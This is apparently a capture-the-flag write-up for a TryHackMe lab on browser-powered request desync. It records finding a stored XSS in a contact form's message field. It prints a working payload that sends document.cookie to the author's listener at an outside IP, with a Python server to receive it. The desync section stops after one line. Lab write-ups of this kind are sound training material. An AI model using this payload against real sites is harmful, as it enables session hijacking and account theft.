# Summary
- link https://tryhackme.com/room/requestsmugglingbrowserdesync
- skills required XSS, python, javascript, HTTP browser desync
- additional readings: https://portswigger.net/research/browser-powered-desync-attacks

# Write-up to get the flag (not the right way)
- to confirm vulnerability on HTTP Browser Desync, connection was checked to be keep-alive.
<img width="861" height="629" alt="Screenshot from 2025-10-03 10-00-24" src="https://github.com/user-attachments/assets/a8f71f80-b033-4a4a-a3f1-6f34b2229f3a" />
- to combine with XSS there need to be a point to inject XSS. This page didn't allow sign up or login. The link 'Help' is for a Contact Us page.
- A simple payload was tested but wasn't executed.
  <img width="861" height="629" alt="image" src="https://github.com/user-attachments/assets/aa6a25fb-014d-40f6-b816-1ff3e528998c" />
- to check if the XSS is executed in the backend I tried another payload
  <img width="861" height="629" alt="Screenshot from 2025-10-03 10-12-29" src="https://github.com/user-attachments/assets/db8a9b0f-5e9b-44a6-bfbb-f6f07ef24ad1" />
- It worked. Then there is nothing stopping us to simply using the message field to carry out a XSS attack.
  <img width="1601" height="539" alt="Screenshot from 2025-10-03 10-14-59" src="https://github.com/user-attachments/assets/b23d6e19-b671-455d-b532-887d716a27d4" />
- the new payload is <img src=x onerror="new Image().src='http://10.11.139.184:4440/?='+document.cookie;">. again in attack bow fire up python3 -m http.server 4440
- Flag obtained.
  <img width="1585" height="614" alt="image" src="https://github.com/user-attachments/assets/6590398c-1bff-4cb1-b53f-d818836ae7bc" />

# Write-up to get the flag (HTTP Browser Desync)
- OK. We are having a stored XSS and keep-alive connect. We can move on to test if the site is vulunable to HTTP Browser Desync attack.
- 
